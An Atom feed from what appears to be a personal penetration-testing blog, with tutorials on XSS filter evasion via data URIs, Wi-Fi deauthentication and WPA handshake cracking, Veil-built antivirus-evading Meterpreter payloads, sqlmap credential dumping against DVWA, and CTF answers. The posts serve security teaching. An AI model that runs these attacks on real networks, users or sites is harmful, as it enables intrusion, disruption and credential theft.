<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[cubalo]]></title>
  <link href="http://cubalo.github.io/atom.xml" rel="self"/>
  <link href="http://cubalo.github.io/"/>
  <updated>2014-04-10T16:00:13-04:00</updated>
  <id>http://cubalo.github.io/</id>
  <author>
    <name><![CDATA[Matt]]></name>
    <email><![CDATA[matt@cubalo.com]]></email>
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[test]]></title>
    <link href="http://cubalo.github.io/blog/2014/04/10/test/"/>
    <updated>2014-04-10T15:36:47-04:00</updated>
    <id>http://cubalo.github.io/blog/2014/04/10/test</id>
    <content type="html"><![CDATA[
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[reboot]]></title>
    <link href="http://cubalo.github.io/blog/2014/04/10/reboot/"/>
    <updated>2014-04-10T14:20:11-04:00</updated>
    <id>http://cubalo.github.io/blog/2014/04/10/reboot</id>
    <content type="html"><![CDATA[<p>Migration from the old site in progress&hellip;</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LUKS Nuke new to Kali 1.0.6]]></title>
    <link href="http://cubalo.github.io/blog/2014/01/17/luks-nuke-new-to-kali-1-0-6/"/>
    <updated>2014-01-17T00:00:00-05:00</updated>
    <id>http://cubalo.github.io/blog/2014/01/17/luks-nuke-new-to-kali-1-0-6</id>
    <content type="html"><![CDATA[<p>An emergency LUKS self-destruct functionality was recently added to Kali v1.0.6. The way this works is by setting two unique decryption passwords; one password will decrypt the data on the drive and allow for normal use and the other password will &#8220;destroy&#8221; the data on the drive. It is fairly easy to configure and a lot of people are excited about it. More information on the feature can be found on the <a href="http://www.kali.org/how-to/emergency-self-destruction-luks-kali/" target="_blank">Kali website</a>.</p>
<p>However, I&#8217;m a bit skeptical about this. The way I look at it, this will stop only the laziest and least skilled individuals. Think about it this way, if I were to seriously seize/steal/inspect a laptop with this feature, the first thing I would do is make a copy of the drive. If you provided me the nuke password, I&#8217;d say that it didn&#8217;t work and revert to the initial image and start again.</p>
<p>More aggressively, if the owner is abducted or the laptop is seized, I see two outcomes:</p>
<ul>
<li>The owner gives the criminal the nuke password, destroys the data, and is subsequently beaten/killed.</li>
<li>The owner gives an LEO the nuke password, destroys the data, and catches an obstruction of justice charge (<a href="http://www.law.cornell.edu/uscode/text/18/1519">federally punishable up to 20 years</a>).</li>
</ul>
<p>So what threat is this really protecting against?</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Bypassing XSS Filters using Data URIs]]></title>
    <link href="http://cubalo.github.io/blog/2014/01/04/bypassing-xss-filters-using-data-uris/"/>
    <updated>2014-01-04T00:00:00-05:00</updated>
    <id>http://cubalo.github.io/blog/2014/01/04/bypassing-xss-filters-using-data-uris</id>
    <content type="html"><![CDATA[<p>One of the web app testers on a team I work with shared a technique for bypassing XSS filters that I hadn&#8217;t used (although admittedly I don&#8217;t get much hands-on time with web apps anymore) &#8211; using data uniform resource identifiers (URIs). Data URIs are defined by <a href="http://tools.ietf.org/html/rfc2397">RFC 2397</a> and can be used to embed file in an HTML document without referencing a file stored on the server.</p>
<p>The way this works is by allowing the data to be self-contained within the URI and if a valid MIME type is specified, the data will be rendered. If a MIME type is not specified, it will default to text/plain which would be okay for textualized data, however to embed binary data one would need to specify base64 in the string. The syntax is as follows:</p>
<pre>&lt;img src="data:[MIMEtype];base64,[DATA]"&gt;</pre>
<p>So to embed this PNG</p>
<p style="text-align: left;"><a href="http://www.cubalo.com/blog/wp-content/uploads/2014/01/glider.png"><img class="size-full wp-image-246" alt="glider" src="http://www.cubalo.com/blog/wp-content/uploads/2014/01/glider.png" width="55" height="55" /></a></p>
<p>using the method shown, the string would be</p>
<pre>&lt;img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADcAAAA3CAAAAACNsI2aAAAACXBIWXMAAAB5AAAAeQBPsriEAAAB6ElEQVR42rVWO46EMAzNadAcY3vaOQMXoXcXKZehS8NpqNxamw8JxDYra1Zjhgge9jhx/By7bYvtl4Y8Qn+tEjty6WxuQ0KkfOM5wJEeEkT1bsigU+xGQV+QfZ2ned0LAkLnyQ4XV2XB/k+jXdTs8Mc1+UlvQehEt5Fit7hLFsUfqfOk3d1lJ9VO+qN1sFvJm+IScB7s3uo8ZVzC8RrsXjIuqp2n0d+sxFNbHxCw9cF34yn2L5jyJWndIprzRfqLpvw0+6PCh1fjgxpP5NL4VzlYEa6zOYDgzyvk0cMbykMek6THipSXAD5/BKh8H/3JGZTxPgM9Px9WDL0CkM1ORJie48nsWAXQ8kW1YxlknKfIWJs/EBXgoZ6Jf2KMNMYz4FgBJjTGkxR/H67vm/H8eP9ShlyRqfli24c0svy0zLNXgOkNtQJEle/P/MPOv8T3TGZIZIbO7sL7BMON74nkuQqUj4XvnMvwiNCBjO+yev2NVDtZLeX5rvD9lu0zauxW+a6dBvJ8H5Gyfzz3wIBkO57rYECyHeeWF+xW+YcT47Jkdzi4TpT+lPNdIv9Z34fxNOxf0PhO91yw5MuMen56AxLPOtG7W9T63SCQ2k9Uol1so3bVnrog2JTyU57n1bb37n3s5s8Of5RfsaTdSlfuyUAAAAA8dEVYdGNvbW1lbnQAIEltYWdlIGdlbmVyYXRlZCBieSBHTlUgR2hvc3RzY3JpcHQgKGRldmljZT1wbm1yYXcpCvqLFvMAAABKdEVYdHNpZ25hdHVyZQA4NWUxYWU0YTJmYmE3OGVlZDRmZDhmMGFjZjIzNzYwOWU4NGY1NDk2Y2RlMjBiNWQ3NmM5Y2JjMjk4YzRhZWJjJecJ2gAAAABJRU5ErkJggg=="&gt;</pre>
<p>Taking advantage of this feature, an attacker can inject their XSS code into the page. In the case of a system that blocks specific strings like &#8220;script&#8221; or symbols like parentheses, this method can be used to disguise the payload and evade the protections. An example of this using the default &#8220;&lt;script&gt;alert(&#8220;XSS&#8221;);&lt;/script&gt;&#8221; payload would be:</p>
<pre>&lt;object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg=="&gt;</pre>
<p>HTML tags that are able to carry these payloads are</p>
<ul>
<li>IFRAME</li>
<li>Object</li>
<li>Anchor</li>
<li>Image</li>
</ul>
<p><span style="line-height: 1.5em;">There are some limitations to this technique though. Most modern browsers support the use of data URIs, however Internet Explorer &lt; 8 does not. IE8 now has support for URIs but only with CSS. Using CSS is not much more difficult than with HTML. Using the image provided above for example, a CSS version would be:</span></p>
<pre>li { 
  background: 
    url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADcAAAA3CAAAAACNsI2aAAAACXBIWXMAAAB5[snip...]) 
    no-repeat 
    left center;
  padding: 5px 0 5px 25px;
}</pre>
<p><strong>Resources:</strong></p>
<ul>
<li>http://css-tricks.com/data-uris/</li>
<li>http://tools.ietf.org/html/rfc2397</li>
<li>https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</li>
<li>http://palizine.plynt.com/issues/2010Oct/bypass-xss-filters/</li>
<li>http://www-archive.mozilla.org/quality/networking/testing/datatests.html</li>
</ul>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[50 Shades Of RED: Stories From The "Playroom"]]></title>
    <link href="http://cubalo.github.io/blog/2013/12/13/50-shades-of-red-stories-from-the-playroom/"/>
    <updated>2013-12-13T00:00:00-05:00</updated>
    <id>http://cubalo.github.io/blog/2013/12/13/50-shades-of-red-stories-from-the-playroom</id>
    <content type="html"><![CDATA[<p>http://www.youtube.com/watch?v=bRqsdBSVM-g</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Deauthing Wireless Clients]]></title>
    <link href="http://cubalo.github.io/blog/2013/12/07/deauthing-wireless-clients/"/>
    <updated>2013-12-07T00:00:00-05:00</updated>
    <id>http://cubalo.github.io/blog/2013/12/07/deauthing-wireless-clients</id>
    <content type="html"><![CDATA[<p>This year at DEFCON, the <a href="http://mobile.slashdot.org/story/13/08/06/0042256/wi-fi-pineapple-hacking-device-sells-out-at-def-con">Hak5 WiFi Pineapples sold out within the first day</a>. I noticed quite a few people walking around with their Pineapples on in Vegas and I&#8217;m sure a few of them were having some luck, but they only work against people attempting to connect to a network, not those who are already connected. So what if we could force those people already connected to drop the connection and try to reconnect? That&#8217;s where a deauth attack is valuable. By deauthenticating the clients and forcing them to reconnect, we can do three things:</p>
<ol>
<li>Denial of service.</li>
<li>Redirect to our rogue access point (Pineapple, PwnPlug, SILICA, etc.).</li>
<li>Capture the WPA handshake and attempt to crack the  password.</li>
</ol>
<p>Actually doing a deauth attack is really simple. I have a cheap laptop with Kali running on it and an Alfa card setup and this works perfectly. The first thing to do is to set up an interface in monitoring mode using airmon.</p>
<pre>airmon-ng start wlan1</pre>
<p>This creates the mon0 interface that we&#8217;ll use throughout the rest of the attack.</p>
<p>Next we need to grab some information about the target network. Do this with airodump</p>
<pre>airodump-ng mon0</pre>
<p>Grab the BSSID and channel number of the target network. Change your interface over to the channel of the target</p>
<pre>iwconfig mon0 channel X</pre>
<p>and we&#8217;ll be ready to start the attack.</p>
<p>To begin deauthing clients, we&#8217;ll need to use aireplay. The syntax is:</p>
<pre>aireplay-ng -0 0 -a 00:00:00:00:00:00 mon0</pre>
<ul>
<li>-0 specifies a deauth attack</li>
<li>-a is the BSSID of the target</li>
<li>mon0 is your monitoring interface</li>
</ul>
<p>When you run this, it will send out deauthentication packets to the network, knocking off clients until you stop it.</p>
<pre>root@kali:~# aireplay-ng -0 0 -a XX:XX:XX:XX:XX:XX mon0
11:37:23  Waiting for beacon frame (BSSID: XX:XX:XX:XX:XX:XX) on channel X
NB: this attack is more effective when targeting
a connected wireless client (-c &lt;client's mac&gt;).
12:37:23  Sending DeAuth to broadcast -- BSSID: [XX:XX:XX:XX:XX:XX]
12:37:23  Sending DeAuth to broadcast -- BSSID: [XX:XX:XX:XX:XX:XX]
12:37:24  Sending DeAuth to broadcast -- BSSID: [XX:XX:XX:XX:XX:XX]
12:37:24  Sending DeAuth to broadcast -- BSSID: [XX:XX:XX:XX:XX:XX]
12:37:25  Sending DeAuth to broadcast -- BSSID: [XX:XX:XX:XX:XX:XX]
12:37:25  Sending DeAuth to broadcast -- BSSID: [XX:XX:XX:XX:XX:XX]
12:37:26  Sending DeAuth to broadcast -- BSSID: [XX:XX:XX:XX:XX:XX]
12:37:26  Sending DeAuth to broadcast -- BSSID: [XX:XX:XX:XX:XX:XX]
12:37:27  Sending DeAuth to broadcast -- BSSID: [XX:XX:XX:XX:XX:XX]
12:37:27  Sending DeAuth to broadcast -- BSSID: [XX:XX:XX:XX:XX:XX]
12:37:27  Sending DeAuth to broadcast -- BSSID: [XX:XX:XX:XX:XX:XX]</pre>
<p>Now the challenge is redirecting those deauthenticated clients to your access point. To do this, have your Pineapple with you and running, or set up another device with the SSID of the target network (assuming you can get your signal stronger than the existing access point) or to the SSID of a common network such as:</p>
<ul>
<li>linksys</li>
<li>guest</li>
<li>NETGEAR</li>
<li>cisco</li>
<li>attwifi (Starbucks)</li>
<li>hhonors (Hilton Hotel)</li>
</ul>
<p>Another option is to capture the WPA/2 handshake with the client reconnects. You can use this to attack the password of the AP in order to get a foothold in the network. To do this, in another terminal have this command typed and ready to go:</p>
<pre>airodump-ng mon0 --bssid XX:XX:XX:XX:XX:XX --channel X --write WPAhandshake</pre>
<p>As soon as you stop sending deauth packets, run that command and wait for the top to have the &#8220;WPA handshake: XX:XX:XX:XX:XX:XX&#8221; value. From there, run aircrack with your wordlist of choice to attemp to crack the password.</p>
<pre>aircrack-ng WPAhandshake.cap -w /usr/share/wordlists/fern-wifi/common.txt</pre>
<p>Finally, a different way of using this attack is to create a jammer. Note that <a href="http://transition.fcc.gov/eb/jammerenforcement/jamfaq.pdf">any kind of jammer in the United States is absolutely illegal</a>, so don&#8217;t do this. I stumbled across <a href="https://code.google.com/p/wifijammer/">this</a> project which essentially does the same thing as aireplay, but against all APs running on a given channel. I have not tested this so I can not verify that it actually works, however to concept is valid.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Bug Fix: binwalk "global name 'Plugins' is not defined"]]></title>
    <link href="http://cubalo.github.io/blog/2013/12/02/bug-fix-binwalk-global-name-plugins-is-not-defined/"/>
    <updated>2013-12-02T00:00:00-05:00</updated>
    <id>http://cubalo.github.io/blog/2013/12/02/bug-fix-binwalk-global-name-plugins-is-not-defined</id>
    <content type="html"><![CDATA[<p>Recently, while trying to work with binwalk on a fresh Kali 1.0 build, I came across this error:</p>
<pre>root@kali:~/Desktop/# binwalk XXXXXXX.bin
Traceback (most recent call last):
  File "/usr/bin/binwalk", line 536, in &lt;module&gt;
    main()
  File "/usr/bin/binwalk", line 481, in main
    plugins_blacklist=plugin_blacklist)
  File "/usr/lib/pymodules/python2.7/binwalk/__init__.py", line 306, in scan
    self.plugins = Plugins(self, whitelist=plugins_whitelist, blacklist=plugins_blacklist)
NameError: global name 'Plugins' is not defined</pre>
<p>It looks like the binwalk.plugins module is referencing something that Python doesn&#8217;t recognize, so to fix this issue, remove the following files:</p>
<pre>/usr/lib/pymodules/python2.7/binwalk/__init__.py
/usr/lib/pymodules/python2.7/binwalk/__init__.pyc</pre>
<p>If that still doesn&#8217;t work (or you&#8217;re using Python 2.6), remove:</p>
<pre>/usr/lib/pymodules/python2.6/binwalk/__init__.py
/usr/lib/pymodules/python2.6/binwalk/__init__.pyc</pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[#avlol]]></title>
    <link href="http://cubalo.github.io/blog/2013/11/30/avlol/"/>
    <updated>2013-11-30T00:00:00-05:00</updated>
    <id>http://cubalo.github.io/blog/2013/11/30/avlol</id>
    <content type="html"><![CDATA[<p>Veil, an antivirus evasion tool, created by Chris Truncer, Mike Wright, and The Grayhound was recently added to the Kali repositories. The developers presented it at NoVA Hackers some weeks ago and it really sparked my interest. I haven&#8217;t had much opportunity to test the payloads it creates, however I have heard of numerous successes with it.</p>
<p>Before we get started, <strong>PLEASE</strong> do not submit your payloads to VirusTotal!</p>
<h2>Installation</h2>
<p>Since Veil is now in the Kali repositories, a simple apt-get will install it for you.</p>
<pre>apt-get update &amp;&amp; apt-get install veil</pre>
<p>This method, however, does not ensure that you are using the bleeding-edge release of Veil, so you can also pull the project down from Github.</p>
<pre>git clone https://github.com/veil-evasion/Veil.git
cd Veil/setup/
./setup.sh</pre>
<h2>Creating a Windows payload</h2>
<p>Once installed, start Veil (veil for the apt-get method, ./Veil.py for git). This will load the framework and its current 20 payloads. For the sake of simplicity, we will create a reverse_tcp Meterpreter payload.</p>
<p>First, list all of the available payloads.</p>
<pre>list</pre>
<p>This will show the available payload names and their rating. For more information on a payload, type:</p>
<pre>info $num</pre>
<p>where the $num is the number next to the payload.</p>
<p>Choose number 13, python/AESEncrypted.</p>
<p>The options are set similarly to Metasploit, so this should be old-hat. If you&#8217;d like to use pyherion, for example, the syntax would be:</p>
<pre>set use_pyherion Y</pre>
<p>Now type generate to start generating the payload. The next section will allow you to choose a source for your shellcode. You can either use msfvenom or provide your custom shellcode. Here, we&#8217;ll opt for msfvenom.</p>
<p>Hit Enter to select the windows/meterpreter/reverse_tcp payload. Again, you can use whatever payload you&#8217;d like. Now, enter the LHOST address (where you want the connection to come back to) and the LPORT number (port to connect back on). Finally, you can enter any other msfvenom options in OPTION=value syntax, but we&#8217;ll skip that for now.</p>
<p>Once you hit Enter, it will generate your shellcode and prompt you to name your payload. Obviously you can change this to whatever you want at a later time, so just name it something easy to remember for the time being. Then you will be prompted to select the method for creating the executable (in this case Pyinstaller or Py2Exe). Choose Pyinstaller and run.</p>
<p>The payload is now created and a bit of information about it is shown in the terminal. The executable will be dropped in ~/veil-output/sources/ and an RC file will be dropped in ~/veil-output/handlers/</p>
<h2>Receiving sessions</h2>
<p>As you may have noticed in the last section, Veil makes an RC file when the payload is generated. This will be used with Metasploit to set up a handler to listen for incoming connections.</p>
<p>To set up the handler, navigate into the handler directory (~/veil-output/handlers/) and run this command with your handler name substituted:</p>
<pre>msfconsole -r payload_handler.rc</pre>
<p>The handler will be running as a background job awaiting the callback from the payload.</p>
<p>Finally, send the payload out to your victim via your method of choice. Once they click it and it executes, you will have your standard meterpreter session and you can start post exploitation and/or pivoting.</p>
<h2>More information</h2>
<p>There are numerous guides posted the Veil website showing exactly how to use this method and numerous others to create payloads. The devopers are also on Twitter, @ChrisTruncer @TheMightyShiv @the_grayhound</p>
<p>https://www.veil-evasion.com/guidesvideos/</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Sqlmap Basics (vs. DVWA)]]></title>
    <link href="http://cubalo.github.io/blog/2013/11/23/sqlmap-basics-vs-dvwa/"/>
    <updated>2013-11-23T00:00:00-05:00</updated>
    <id>http://cubalo.github.io/blog/2013/11/23/sqlmap-basics-vs-dvwa</id>
    <content type="html"><![CDATA[<p>I&#8217;ve been insanely busy with work for the past few weeks so I&#8217;ve been neglecting the site a bit. In the past I&#8217;ve done a lot of web app testing, but as of late is has become a rare occurrence so I need to make sure I keep my skills up. Usually, I fire up Web Security Dojo and mess around a bit with WebGoat/Gruyere/DVWA. This time I thought I would actually put my thoughts and process into words and share it. In this tutorial, I will demonstrate how to use sqlmap to get SQL injection on DVWA under the medium security settings.</p>
<h2>Setup</h2>
<p>Start up a VM running something with DVWA (Dojo, Metasploitable, etc.) then login to the app (default credentials are admin:password). On the bottom-left side of the page will be a menu option titled &#8220;DVWA Security&#8221;. Click that and change the Script Security to &#8220;medium.&#8221; This doesn&#8217;t really matter since we will be using sqlmap to do the heavy lifting.</p>
<p><a href="http://www.cubalo.com/blog/wp-content/uploads/2013/11/sqlmap_1.png"><img class="alignnone size-medium wp-image-211" alt="sqlmap_1" src="http://www.cubalo.com/blog/wp-content/uploads/2013/11/sqlmap_1-300x244.png" width="300" height="244" /></a></p>
<h2>Gathering Info</h2>
<p>Next, fire up Burp Suite, start the proxy with Intercept turned off, and tell your browser to go through it (using the Foxy Proxy browser plugin is the easiest).</p>
<p>In the browser, click the &#8220;SQL Injection&#8221; challenge from the menu on the left side of the page. Once the page is loaded, there will be a text box to search a user ID. Go back into Burp and turn on Intercept. In the browser, enter 1 into the box. This will return the information for the user with ID 1, admin. You&#8217;ll notice that the page isn&#8217;t loading. This is because Burp is intercepting the communication. Open up the Burp window and notice the GET request. From here, we want to grab the destination and cookie value and save it for later.</p>
<p><a href="http://www.cubalo.com/blog/wp-content/uploads/2013/11/sqlmap_2.png"><img class="alignnone size-medium wp-image-212" alt="sqlmap_2" src="http://www.cubalo.com/blog/wp-content/uploads/2013/11/sqlmap_2-300x121.png" width="300" height="121" /></a></p>
<p>Click the Forward button until the page is loaded and turn off Intercept. Now go back the browser and you&#8217;ll see the SQLi page is loaded and showing the details for the user &#8220;admin.&#8221;</p>
<p><a href="http://www.cubalo.com/blog/wp-content/uploads/2013/11/sqlmap_3.png"><img class="alignnone size-medium wp-image-213" alt="sqlmap_3" src="http://www.cubalo.com/blog/wp-content/uploads/2013/11/sqlmap_3-300x146.png" width="300" height="146" /></a></p>
<p>This shows that the information we enter into the text box is what is being queried in the database, so this will be our target for injection.</p>
<h2>Dumping users and passwords</h2>
<p>In a terminal, we need to provide sqlmap with the options it needs to attack the app. The command you will want to enter is:</p>
<pre>sqlmap -u "http://192.168.1.111/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit" --cookie="security=medium ; PHPSESSID=4c74cbff87f966532a7111ba2480620f" --dbs</pre>
<p>The structure of this command is as follows.</p>
<ul>
<li>-u  = Host (mine is 192.168.1.111) + Path (/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit)</li>
<li>&#8211;cookie = Both of the cookies we captured in Burp. You will need two, security and PHPSESSID.</li>
<li>&#8211;dbs = Enumerate databases</li>
</ul>
<p>When running, choose to continue with whatever sqlmap asks you. It will find that the &#8216;id&#8217; parameter is vulnerable and ask if you want to keep testing others. Choose &#8220;N.&#8221; Once completed, it will display the injection points (mine showed 4 types) and the available databases.</p>
<p><a href="http://www.cubalo.com/blog/wp-content/uploads/2013/11/sqlmap_4.png"><img class="alignnone size-medium wp-image-214" alt="sqlmap_4" src="http://www.cubalo.com/blog/wp-content/uploads/2013/11/sqlmap_4-300x160.png" width="300" height="160" /></a></p>
<p>From here, we need to select what database we want to go after. For this example, we&#8217;ll hit &#8220;dvwa.&#8221; So now, in sqlmap we need to find out the tables in the database. To do this, we need to modify the options a little bit. Remove the &#8211;dbs option and add &#8220;-D dvwa &#8211;tables&#8221; to make the new command:</p>
<pre>sqlmap -u "http://192.168.1.111/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit" --cookie="security=medium ; PHPSESSID=4c74cbff87f966532a7111ba2480620f" -D dvwa --tables</pre>
<p>This will show us the tables, guestbook and users.</p>
<p><a href="http://www.cubalo.com/blog/wp-content/uploads/2013/11/sqlmap_5.png"><img class="alignnone size-medium wp-image-215" alt="sqlmap_5" src="http://www.cubalo.com/blog/wp-content/uploads/2013/11/sqlmap_5-300x160.png" width="300" height="160" /></a></p>
<p>Next we&#8217;ll dump the columns from the table. Do this by removing the &#8220;&#8211;tables&#8221; option from the command and add &#8220;-T users &#8211;columns&#8221; and run it.</p>
<pre>sqlmap -u "http://192.168.1.111/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit" --cookie="security=medium ; PHPSESSID=4c74cbff87f966532a7111ba2480620f" -D dvwa -T users --columns</pre>
<p><a href="http://www.cubalo.com/blog/wp-content/uploads/2013/11/sqlmap_6.png"><img class="alignnone size-medium wp-image-216" alt="sqlmap_6" src="http://www.cubalo.com/blog/wp-content/uploads/2013/11/sqlmap_6-300x160.png" width="300" height="160" /></a></p>
<p>We can see that there are some interesting values in this table, so we definitely want to dump this. A cool option sqlmp provides us with is the ability to bruteforce password hashes during the dump. During the next and final command, we will have the option to crack the hashes so make sure to approve it when it pops up (the default dictionary, option 1, works just fine). The final command to dump the table&#8217;s data is:</p>
<pre>sqlmap -u "http://192.168.1.111/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit" --cookie="security=medium ; PHPSESSID=4c74cbff87f966532a7111ba2480620f" -D dvwa -T users --dump</pre>
<p><a href="http://www.cubalo.com/blog/wp-content/uploads/2013/11/sqlmap_7.png"><img class="alignnone size-medium wp-image-217" alt="sqlmap_7" src="http://www.cubalo.com/blog/wp-content/uploads/2013/11/sqlmap_7-300x160.png" width="300" height="160" /></a></p>
<p>When it is done cracking, we will have all of the passwords for DVWA, including the admin user.</p>
<h2>Conclusion</h2>
<p>Obviously, we were attacking an extremely vulnerable web application in this tutorial, however sqlmap provides a ton of options to tailor the command to your needs for the more challenging tests. I have found that during a normal assessment, sqlmap can prove to be very useful, however do not expect it to be a skeleton key for all databases you come across. For example, by changing the Script Security to &#8220;high&#8221; in DVWA, restrictions are placed on the &#8216;id&#8217; parameter which was found to be injectable on the medium security setting, making it non-injectable using the method in this tutorial.</p>
<p><a href="http://www.cubalo.com/blog/wp-content/uploads/2013/11/sqlmap_8.png"><img class="alignnone size-medium wp-image-218" alt="sqlmap_8" src="http://www.cubalo.com/blog/wp-content/uploads/2013/11/sqlmap_8-300x116.png" width="300" height="116" /></a></p>
<p>(Notice the &#8220;$id = stripslashes($id);&#8221; and if statement checking if the $id value is numeric.)</p>
<p>Also, don&#8217;t forget to turn off your machine or VM running your vulnerable app when you are done!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CSAW CTF 2013 Writeup]]></title>
    <link href="http://cubalo.github.io/blog/2013/10/01/csaw-ctf-2013-writeup/"/>
    <updated>2013-10-01T00:00:00-04:00</updated>
    <id>http://cubalo.github.io/blog/2013/10/01/csaw-ctf-2013-writeup</id>
    <content type="html"><![CDATA[<p>NYU-Poly&#8217;s Cyber Security Awareness Week (CSAW) Capture the Flag (CTF) event was held this year from September 19-22. This CTF is geared towards undergrads looking to break into security, however the event provides some decent challenges for professionals.</p>
<p>Unfortunately, I wasn&#8217;t able to dedicate as much time to the contest as I would have like to due to some personal obligations but I was able to knock out quite a few challenges. The solutions and explanations follow.</p>
<h3>Trivia 1 – 50 points</h3>
<p><strong>Challenge</strong>: &#8220;Drink all the booze, ____ all the things!&#8221;<br />
<strong>Answer</strong>: hack<br />
<strong>Explanation</strong>: Lyrics from Dual Core’s “All The Things.” <a href="http://www.youtube.com/watch?v=FoUWHfh733Y">http://www.youtube.com/watch?v=FoUWHfh733Y</a></p>
<h3>Trivia 2 – 50 points</h3>
<p><strong>Challenge</strong>: &#8220;What is the abbreviation of the research published in the Hackin9 issue on nmap by Jon Oberheide, Nico Waisman, Matthieu Suiche, Chris Valasek, Yarochkin Fyodor, the Grugq, Jonathan Brossard, and Mark Dowd?&#8221;<br />
<strong>Answer</strong>: DICKS<br />
<strong>Explanation</strong>: The title of the Hackin9 article was “Nmap: The Internet Considered Harmful - DARPA Inference Cheking Kludge Scanning”<br />
<a href="http://www.theregister.co.uk/2012/10/05/hakin9_silliness/">http://www.theregister.co.uk/2012/10/05/hakin9_silliness/</a></p>
<h3>Trivia 3 – 50 points</h3>
<p><strong>Challenge</strong>: &#8220;What is the common name for a single grouping of instructions used in a Return Oriented Programming payload, typically ending in a return (ret) instruction?&#8221;<br />
<strong>Answer</strong>: gadget<br />
Explanation: <a href="http://en.wikipedia.org/wiki/Return-oriented_programming">http://en.wikipedia.org/wiki/Return-oriented_programming</a></p>
<h3>Trivia 4 – 50 points</h3>
<p><strong>Challenge</strong>: &#8220;What is the new web technology that provides a web browser full-duplex communication to a web server over a single connection?&#8221;<br />
<strong>Answer</strong>: WebSocket<br />
<strong>Explanation</strong>: <a href="http://www.websocket.org/aboutwebsocket.html">http://www.websocket.org/aboutwebsocket.html</a></p>
<h3>Trivia 5 – 50 points</h3>
<p><strong>Challenge</strong>: &#8220;What is the x86 processor operating mode for running 64-bit code?&#8221;<br />
<strong>Answer</strong>: long mode<br />
<strong>Explanation</strong>: <a href="http://wiki.osdev.org/X86-64#Long_Mode">http://wiki.osdev.org/X86-64#Long_Mode</a></p>
<h3>Web 1 – 100 points</h3>
<p><strong>Challenge</strong>: This challenge required you to &#8220;guess&#8221; the password for the admin user.<br />
<strong>Answer</strong>: told_ya_you_wouldnt_guess_it<br />
<strong>Method</strong>: Using a proxy such as Burp, intercept the POST when logging in and change the cookie value to “admin=true”. Once logged in, the flag will be presented.</p>
<h3>Exploitation1 – 100 points</h3>
<p><strong>Challenge</strong>: An IP address and a port were provided as well as two files.<br />
<strong>Answer</strong>: 7c1fbb502632bffa6e62ba6fa847681f<br />
<strong>Method</strong>: Netcat to the IP/Port specified in the challenge description and then send data greater than 4096 bytes (I used A’s). This will return the flag and close the connection.</p>
<h3>Misc. 1 – 50 points</h3>
<p><strong>Challenge</strong>: A PCAP file was provided.<br />
<strong>Answer</strong>: d316759c281bf925d600be698a4973d5 –<br />
<strong>Method</strong>: The PCAP includes Telnet traffic, so using Wireshark I followed the TCP stream and the flag was in the traffic.</p>
<h3>Misc. 2 – 50 points</h3>
<p><strong>Challenge</strong>: 2 files were provided, networking.pcap and networking.pcap.process<br />
<strong>Answer</strong>: f9b43c9e9c05be5e08ea163007af5144 –<br />
<strong>Method</strong>: Catted the networking.pcap.process file and it was littered with the flag.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Creating Wordlists with Crunch]]></title>
    <link href="http://cubalo.github.io/blog/2013/09/13/creating-wordlists-with-crunch/"/>
    <updated>2013-09-13T00:00:00-04:00</updated>
    <id>http://cubalo.github.io/blog/2013/09/13/creating-wordlists-with-crunch</id>
    <content type="html"><![CDATA[<p>Crunch is a wordlist generator project which can create long and complex lists to audit the strength of passwords. This tool also affords a great level of control in creating wordlists, allowing users to control the characters used, minimum and maximum lengths, and specify certain patterns. It is designed to be used with Linux, so support for Windows/BSD/OS X is unknown.</p>
<h2>Installation</h2>
<p>To install Crunch, first download the latest version (currently 3.4) from Sourceforge.</p>
<pre>http://sourceforge.net/projects/crunch-wordlist/files/crunch-wordlist/crunch-3.4.tgz/download</pre>
<p>Then extract the files from the archive.</p>
<pre>tar -xvf crunch-3.4.tar.gz</pre>
<p>Finally, change into the new Crunch directory and install the tool.</p>
<pre>cd crunch-3.4</pre>
<pre>make &amp;&amp; make install</pre>
<h2>Usage</h2>
<p>You can check the user manual by using the man command. Basic usage is as follows</p>
<pre>./crunch [min length] [max length] [character set] [options]</pre>
<h3>Examples:</h3>
<p>Create a list of all lowercase alpha passwords 3 characters in length:</p>
<pre>./crunch 3 3</pre>
<p>Create a list of passwords 4 characters in length using only 1, 2, 3, A, B, C, and D:</p>
<pre>./crunch 4 4 123ABCD</pre>
<p>Create the same list as above, including the special characters $, %, and &amp;:</p>
<pre>./crunch 4 4 123ABCD\$\%<pre wp-pre-tag-7></pre>amp;</pre>
<p>Send the output of the previous command to a file and zip it in the 7zip format:</p>
<pre>./crunch 4 4 123ABCD\$\%<pre wp-pre-tag-8></pre>amp; -o new_wordlist.txt -z 7z</pre>
<p>Use the rainbow tables character sets file (charset.txt) to create a list of passwords 4-8 characters in length including upper, lower, numerical and special:</p>
<pre>./crunch 4 8 -f charset.txt mixalpha-numeric-all</pre>
<p><em>Note: charset.txt can be found <a href="http://www.rainbowtables.net/misc/charset.txt">here</a></em></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Gen. Alexander Black Hat 2013 Keynote]]></title>
    <link href="http://cubalo.github.io/blog/2013/08/05/gen-alexander-black-hat-2013/"/>
    <updated>2013-08-05T00:00:00-04:00</updated>
